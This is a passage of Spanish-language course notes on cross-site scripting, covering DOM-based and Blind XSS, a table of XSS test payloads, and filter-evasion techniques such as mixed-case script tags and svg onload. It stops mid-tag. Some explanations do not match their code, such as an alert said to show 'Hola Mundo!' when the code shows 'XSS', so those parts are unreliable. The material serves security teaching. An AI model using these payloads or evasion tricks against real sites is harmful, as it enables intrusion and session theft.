integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ca44b549-d3b3-48e9-96b4-41284b97789d" class="code code-wrap"><code class="language-HTML">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+	&lt;title&gt;Ejemplo de DOM&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+	&lt;h1 id=&quot;titulo&quot;&gt;Bienvenido&lt;/h1&gt;
+	&lt;p id=&quot;parrafo&quot;&gt;Este es un ejemplo de cómo se utiliza el DOM en una página web.&lt;/p&gt;
+	&lt;button onclick=&quot;cambiarTexto()&quot;&gt;Cambiar Texto&lt;/button&gt;
+
+	&lt;script&gt;
+		function cambiarTexto() {
+			document.getElementById(&quot;titulo&quot;).innerHTML = &quot;Nuevo Título&quot;;
+			document.getElementById(&quot;parrafo&quot;).innerHTML = &quot;El texto ha sido cambiado.&quot;;
+		}
+	&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p id="17d544c5-9d22-4d2a-94ec-bf5ee8e0926e" class="">En este ejemplo, el código JavaScript utiliza el DOM para acceder y cambiar el contenido de un encabezado y un párrafo en la página web. Cuando el usuario hace clic en el botón, se ejecuta la función <code>cambiarTexto()</code>, que utiliza la función <code>document.getElementById()</code> para acceder a los elementos con los ID &quot;titulo&quot; y &quot;parrafo&quot; y cambiar su contenido utilizando la propiedad <code>innerHTML</code>.</p><p id="4c7fa567-9022-45c7-a366-2a5ac23de555" class="">
+</p><p id="c0902f71-7558-4be0-806d-061be73a9fdf" class=""><strong>Volvamos a hablar del DOM-based XSS:</strong></p><p id="79293eec-ea1b-4d82-9644-6b61c27a28bb" class="">Este tipo de ataque consiste en modificar el árbol del documento (DOM) del navegador mediante un código malicioso que se ejecuta del lado del cliente.</p><figure id="9f160431-4dea-43ff-ba83-14e202f7ce7b" class="image"><a href="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/DOM_XSS.png"><img style="width:816px" src="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/DOM_XSS.png"/></a><figcaption>Imagen: XSS basado en DOM</figcaption></figure><p id="5cd81237-1a50-4527-8e62-ae3a59a4938a" class="">
+</p><p id="3093070e-b4e8-4ef9-a4a2-6b886f118eb8" class="">Un atacante podría aprovechar una página web que utiliza el parámetro de URL después del símbolo # para inyectar código malicioso. Supongamos que una página web utiliza la siguiente URL para cargar contenido dinámico:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="63a6d09d-b269-484e-b9f5-19caf433dd2d" class="code"><code class="language-JavaScript">https://www.ejemplo.com/pagina# </code></pre><p id="bd69edeb-b7ef-4b49-bc70-202f2a7cb05e" class="">Un atacante podría enviar un enlace a un usuario que contenga el siguiente script malicioso: </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dd97cf52-7332-4ed1-a8e9-f93aae84cf9d" class="code code-wrap"><code class="language-Plain Text">&lt;https://www.ejemplo.com/pagina#javascript:alert(&#x27;XSS&#x27;)&gt;</code></pre><p id="215e387b-73dc-4983-9d96-840621d1e5a7" class="">Cuando el usuario haga clic en el enlace, el script se ejecutará y mostrará la alerta &quot;Hola Mundo!&quot;.  En este caso se ejecuta del lado de la Víctima.</p><h2 id="83c556b8-adf2-4afa-81c1-67f3891ebb38" class="">Blind XSS</h2><p id="b743518f-118e-4ebf-b736-a4c131a5097f" class="">Recordemos que cuando hablamos de ataques “Blind” (A Ciegas) hacen referencia a que el atacante no recibe el resultado de forma inmediata o incluso no recibe resultado alguno, hasta no tener éxito en sus ataques.</p><p id="f1a9ebd7-fc9b-4a93-ac15-db1479ec061e" class="">Blind XSS es una técnica de ataque que consiste en enviar código malicioso a una aplicación web que no se ejecuta de inmediato, sino que se almacena en la base de datos del sitio web y se ejecuta más tarde cuando un usuario legítimo accede a la página web. Esta técnica de ataque es especialmente peligrosa porque puede pasar desapercibida durante mucho tiempo y causar daños significativos.</p><figure id="125f1223-abc4-4349-9b27-b23e2bf28565" class="image"><a href="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Blind_XSS.png"><img style="width:864px" src="Mo%CC%81dulo%2013%20-%20Cross%20Site%20Scripting%20(XSS)%2025df4aaecd774bdea5bb81971de3278f/Blind_XSS.png"/></a><figcaption>Imagen: Blind XSS</figcaption></figure><p id="ee948093-402f-4fe3-831e-b41d1c3469db" class="">
+</p><p id="868d0f9b-417f-49c4-ad78-e54c53d59265" class="">Supongamos que un atacante desea explotar una vulnerabilidad de Blind XSS en un sitio web de comentarios. En lugar de enviar el código malicioso directamente a la página web, el atacante enviará un comentario que contiene el código malicioso. Cuando el comentario se almacena en la base de datos del sitio web, el código malicioso no se ejecuta de inmediato. En su lugar, el código se ejecutará cuando un usuario legítimo visite la página web que muestra los comentarios.</p><p id="8e570d2d-55bd-4adc-895f-f5547a2aca9b" class="">Para explotar esta vulnerabilidad, el atacante necesita encontrar una forma para que el sitio web almacene el código malicioso. Esto puede hacerse de varias maneras, como enviar un comentario malicioso o utilizar un formulario de contacto para enviar un correo electrónico al administrador del sitio web.</p><p id="b47aeb95-1e2e-4d9a-abd6-152b02aaf0c1" class="">Un ejemplo de cómo se podría explotar el Blind XSS es a través de un formulario de contacto. Supongamos que un sitio web tiene un formulario de contacto que permite a los usuarios enviar un correo electrónico al administrador del sitio web. El formulario tiene un campo de entrada para el asunto del correo electrónico y un campo de entrada para el cuerpo del correo electrónico. Un atacante podría enviar un correo electrónico al administrador del sitio web que contenga el siguiente código malicioso en el campo del asunto:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="08648449-85a8-4e8a-ac50-bc36a98fdd07" class="code code-wrap"><code class="language-Plain Text">&lt;script&gt;alert(&#x27;Hola Mundo!&#x27;)&lt;/script&gt; </code></pre><p id="2ae1514c-c714-4913-b8af-b08ba337e2c4" class="">Cuando el administrador del sitio web abra el correo electrónico y vea el campo del asunto, el código malicioso se almacenará en la base de datos del sitio web. Más tarde, cuando un usuario legítimo acceda a la página web que muestra los correos electrónicos enviados al administrador del sitio web, el código malicioso se ejecutará y mostrará la alerta &quot;Hola Mundo!&quot;.</p><p id="7d1b67f6-f4e3-4b92-b5e0-aa22420871e2" class="">Ejemplo de URL que podría utilizarse para explotar esta vulnerabilidad:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ad863c11-b820-4d83-a51f-d099612bdfa0" class="code code-wrap"><code class="language-Plain Text">&lt;https://www.ejemplo.com/contacto?asunto=&gt;&lt;script&gt;alert(&#x27;Hola%20Mundo!&#x27;)&lt;/script&gt;&amp;cuerpo=Este%20es%20un%20correo%20electrónico%20de%20prueba.</code></pre><h2 id="1ae01360-4bc1-48c8-9adf-6a56219edaaf" class="">XSS Payloads (Cadenas de Texto de prueba)</h2><p id="d99d4f07-454e-49ce-8c53-970a60b02a23" class="">Aquí hay una lista de ejemplos de payloads que se pueden utilizar para detectar vulnerabilidades XSS en una aplicación web:</p><p id="cb82c158-0b32-4e1b-9ad5-85bcb5b0c22f" class="">
+</p><table id="8767cfbc-b832-4f2c-b6d8-68ac2bdb1744" class="simple-table"><thead class="simple-table-header"><tr id="f6f22bf3-8bae-4648-afcb-8e35378ba7bc"><th id="I]{q" class="block-color-orange_background simple-table-header" style="width:466.99713134765625px">Payload</th><th id="mfxw" class="block-color-orange_background simple-table-header" style="width:944.991455078125px">Explicación</th></tr></thead><tbody><tr id="c983dff3-74ce-4d3d-a3ae-f7bdfc48a088"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Muestra una alerta en el navegador que indica la presencia de una vulnerabilidad de XSS en la página web.</td></tr><tr id="f3cd9503-9fe9-4f52-aa81-d263e43fd30c"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;img src=1 onerror=alert(&#x27;XSS&#x27;)&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar una imagen que no existe y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="6b30e02b-4840-4a97-af05-c6c9246730d6"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar una imagen que no existe y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="7aef285a-338f-4067-b415-d3b8fdd3b2fa"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar un archivo SVG y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="3d5ed7ba-da89-460f-b5a6-5e6dc212a7f5"><td id="I]{q" class="" style="width:466.99713134765625px"><code>javascript:alert(&#x27;XSS&#x27;)</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta ejecutar un script en el navegador y muestra una alerta si hay una vulnerabilidad de XSS presente.</td></tr><tr id="e08c9b59-e77f-4d20-80d2-d9b83128e5fa"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta inyectar un script en una página web y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="9eb8c168-8d5e-4fd4-b0e3-8fcd4f5a2688"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&quot;&gt;&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta inyectar un archivo SVG en una página web y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="54f6c873-a127-4757-ba85-10b3db7b455c"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta ejecutar un script en el navegador y muestra una alerta si hay una vulnerabilidad de XSS presente.</td></tr><tr id="a8b26acf-915a-46a7-a126-2fef4c60cddf"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;iframe src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;&lt;/iframe&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar un iframe con un código JavaScript que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="fa89f228-571a-443c-89ce-8236ff60633a"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot; /&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar una imagen que no existe y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="1fa05878-eae0-4656-95fb-5af00a44ecfb"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&quot;&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta inyectar un script en una página web y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="6494ca5b-0d56-4765-8bcf-45e56693ffd6"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;img src=x onerror=&quot;alert(String.fromCharCode(88,83,83))&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar una imagen que no existe y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="8ef7ae10-f5df-41bb-94dc-56f994ef46d6"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;div style=&quot;background-image:url(javascript:alert(&#x27;XSS&#x27;))&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar una imagen que no existe y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="f9713000-f581-4979-96ca-23d07b2df1cf"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onmouseover=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="700b5933-64ac-4c2e-97f3-960c8ff26eb5"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onfocus=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="eff98e2f-75f7-45a2-888c-d2daa42746bd"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onblur=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="6c39a4a7-bdf6-47ec-b0eb-5ee29e721398"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onchange=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="e21bc9b2-698f-4692-8656-2ad49be7ddf1"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onselect=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="8a5a8820-b5d8-4fba-b8dc-d8b94c903533"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onsubmit=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="eed5224b-915b-4697-8160-c837cf7d2d65"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onreset=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="f38ed776-53e3-4427-83d3-b8dbbdf600f8"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onkeydown=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="3861bd2d-fa22-461d-9479-54f3952282c7"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onkeyup=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="c058b765-b384-424f-a6f3-69b62e8e00f1"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;input type=&quot;text&quot; value=&quot;XSS&quot; onkeypress=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="25e69d59-7abf-42ef-aa37-84a805e18e0b"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;XSS&lt;/a&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Muestra un enlace en la página web que, si se hace clic, ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="bbc71ed6-40bf-4299-871b-e6a9b046f76f"><td id="I]{q" class="" style="width:466.99713134765625px"><code>&lt;a href=&quot;javascript:document.cookie=&#x27;cookievalue=XSS&#x27;&quot;&gt;XSS&lt;/a&gt;</code></td><td id="mfxw" class="" style="width:944.991455078125px">Muestra un enlace en la página web que, si se hace click muestra el Cookie de la Página</td></tr><tr id="03aa1b33-7328-47c3-ab4b-0584e7068444"><td id="I]{q" class="" style="width:466.99713134765625px">&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;</td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar una imagen que no existe y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="b82f14de-da35-43d6-9fa1-bcea1b7f4df8"><td id="I]{q" class="" style="width:466.99713134765625px">&lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar un archivo SVG y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="3273e48c-fc92-4448-968b-79a4fae991d3"><td id="I]{q" class="" style="width:466.99713134765625px">&lt;iframe src=javascript:alert(&#x27;XSS&#x27;)&gt;&lt;/iframe&gt;</td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar un iframe con un código JavaScript que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="c6c9a587-7592-4b49-bff0-deb6e69ee800"><td id="I]{q" class="" style="width:466.99713134765625px">&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</td><td id="mfxw" class="" style="width:944.991455078125px">Un payload complejo que incluye caracteres especiales que pueden evadir los filtros de XSS y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="8a0d82f0-ae22-4c0c-99b9-c8920ed06c44"><td id="I]{q" class="" style="width:466.99713134765625px">&lt;script&gt;confirm(document.domain)&lt;/script&gt;</td><td id="mfxw" class="" style="width:944.991455078125px">Muestra una ventana emergente de confirmación que indica el dominio actual de la página web y puede indicar la presencia de una vulnerabilidad de XSS.</td></tr><tr id="ae4d8c96-f31d-41b2-8e21-4882005a7b4e"><td id="I]{q" class="" style="width:466.99713134765625px">&lt;input type=&quot;text&quot; value=&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;&gt;</td><td id="mfxw" class="" style="width:944.991455078125px">Carga un valor predeterminado en un campo de entrada de texto que ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="9b8df98e-5cc4-44ed-8020-a3e5dc0422d1"><td id="I]{q" class="" style="width:466.99713134765625px">&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;Click Me&lt;/a&gt;</td><td id="mfxw" class="" style="width:944.991455078125px">Muestra un enlace en la página web que, si se hace clic, ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="61b2e921-f96d-4653-a224-3245e61daabd"><td id="I]{q" class="" style="width:466.99713134765625px">&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</td><td id="mfxw" class="" style="width:944.991455078125px">Intenta cargar una imagen que no existe y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr><tr id="c3a07fbe-fca2-485e-8949-235e98ddbc24"><td id="I]{q" class="" style="width:466.99713134765625px">&#x27;;alert(String.fromCharCode(88,83,83))//\&#x27;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</td><td id="mfxw" class="" style="width:944.991455078125px">Un payload complejo que incluye caracteres especiales que pueden evadir los filtros de XSS y ejecuta una alerta en el navegador si hay una vulnerabilidad de XSS presente.</td></tr></tbody></table><h1 id="37568fc9-caa5-432e-99a3-6a1709023d62" class="">Técnicas de Ataque XSS</h1><h2 id="b5e105d9-0e48-4058-81f6-7dcf5af1083f" class="">Capitalizing</h2><p id="e194dc79-08dd-4868-be2c-6765b5e7d738" class="">Es una técnica que consiste en usar mayúsculas y minúsculas de forma alternativa o aleatoria en el código malicioso que se quiere inyectar en una página web, con el fin de evitar filtros o sanitizaciones que puedan bloquear el ataque;  Por ejemplo, si un filtro busca la cadena “script” para evitar que se inserte un elemento HTML &lt;script&gt;, se podría usar “ScRiPt” o “sCrIpT” para burlar el filtro<strong>1</strong>. Un ejemplo de payload que usa capitalizing para XSS es el siguiente:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3c718d06-8555-4a21-b30d-fa63fef1c16c" class="code"><code class="language-HTML">&lt;ScRiPt&gt;alert(‘XSS’)&lt;/ScRiPt&gt;</code></pre><p id="376163d3-d68c-4f14-add2-a1eaa16a6439" class="">Este payload intenta ejecutar una alerta con el mensaje “XSS” en el navegador del usuario. </p><p id="cfb90675-d0b5-4c2a-920d-62d76c1a5d99" class="">
+</p><p id="1414a2f1-5b58-4e5c-8d73-da6097982c92" class="">Aquí hay una lista de ejemplos de capitalizing para XSS:</p><table id="e1d960d1-4ea9-4d7a-8993-c8b4bcc3df7e" class="simple-table"><tbody><tr id="67015778-9533-40c9-9b64-53a644d8a6c3"><td id="zzup" class="block-color-teal_background" style="width:423px"><strong>Payload</strong></td></tr><tr id="00f155e5-5beb-433a-be3d-a52ba745bebb"><td id="zzup" class="" style="width:423px"><code>&lt;ScRiPt&gt;alert(&#x27;XSS&#x27;)&lt;/ScRiPt&gt;</code></td></tr><tr id="0881affa-aa6c-4a83-94a4-bbc8b101f2e4"><td id="zzup" class="" style="width:423px"><code>&lt;sCrIpT&gt;alert(&#x27;XSS&#x27;)&lt;/sCrIpT&gt;</code></td></tr><tr id="bf6668ea-d9af-4b0e-9963-5b8d337c33dd"><td id="zzup" class="" style="width:423px"><code>&lt;SCRIPT&gt;alert(&#x27;XSS&#x27;)&lt;/SCRIPT&gt;</code></td></tr><tr id="d86436f6-816e-4971-bb05-b789bf614fcb"><td id="zzup" class="" style="width:423px"><code>&lt;sCRipt&gt;alert(&#x27;XSS&#x27;)&lt;/sCRipt&gt;</code></td></tr><tr id="46c332ef-3de8-4275-b32b-05cd03bc8673"><td id="zzup" class="" style="width:423px"><code>&lt;ScRiPt&gt;alert(String.fromCharCode(88,83,83))&lt;/ScRiPt&gt;</code></td></tr></tbody></table><h2 id="3309498c-2160-4d93-954f-e9b3d38d2688" class="">Alternative JavaScript Syntax (Sintaxis Alternativa de JavaScript)</h2><p id="eb1988f3-7bd7-449e-9222-c31bf627a503" class="">Es una técnica que consiste en usar diferentes formas de escribir código JavaScript que producen el mismo efecto, con el fin de evitar filtros o sanitizaciones que puedan bloquear el ataque. </p><p id="07f24d46-64ac-4b09-a5e5-b505830438bd" class="">Por ejemplo, si un filtro busca la cadena “script” para evitar que se inserte un elemento HTML &lt;script&gt;, se podrían usar otras etiquetas o atributos que también ejecuten código JavaScript, como &lt;body onload&gt;, &lt;img onerror&gt;, &lt;onmouseover&gt;, etc. Un ejemplo de payload que usa Alternative JavaScript Syntax para XSS es el siguiente:</p><p id="766d1b1d-0acc-447a-9a5e-cd6f32dd38bf" class="">En lugar de utilizar la sintaxis convencional de JavaScript para ejecutar una alerta, un atacante puede utilizar la sintaxis alternativa para el mismo efecto:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="980cafca-0af3-42c8-b9ff-33756c4ca6c2" class="code code-wrap"><code class="language-Plain Text">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</code></pre><p id="46e6bc5e-9e12-4d33-a599-6cd3a5e141e0" class="">En este ejemplo, el atacante ha utilizado la etiqueta <code>&lt;svg&gt;</code> para engañar al filtro de seguridad y ejecutar el script malicioso. La etiqueta <code>&lt;svg&gt;</code> es una etiqueta legítima de HTML que se utiliza para describir gráficos vectoriales escalables, pero en este caso se ha utilizado de manera maliciosa.</p><p id="7d002109-4192-4775-86a2-d0e09f362876" class=""><span style="border-bottom:0.05em solid"><strong>Ejemplo 1:</strong></span></p><p id="021cb245-8546-476a-a9d8-b0359cf4a0e3" class=""><mark class="highlight-purple_background">Uso del atributo </mark><mark 